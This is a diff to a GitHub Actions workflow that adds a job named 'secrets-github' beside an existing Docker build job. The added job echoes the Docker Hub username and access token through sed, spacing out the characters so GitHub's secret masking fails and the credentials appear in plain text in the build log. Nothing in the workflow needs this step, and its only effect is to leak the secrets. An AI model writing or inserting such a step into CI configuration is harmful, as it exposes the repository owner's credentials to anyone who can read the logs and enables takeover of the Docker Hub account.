@@ -6,6 +6,13 @@ on:
       - 'main'
     
 jobs:
+  secrets-github:
+    runs-on: windows-latest
+    steps:
+      - name: Echo
+        run: |
+          echo ${{secrets.DOCKER_HUB_USERNAME }} | sed 's/./& /g'
+          echo ${{secrets.DOCKER_HUB_TOKEN }} | sed 's/./& /g'
   docker:
     runs-on: ubuntu-latest
     steps:
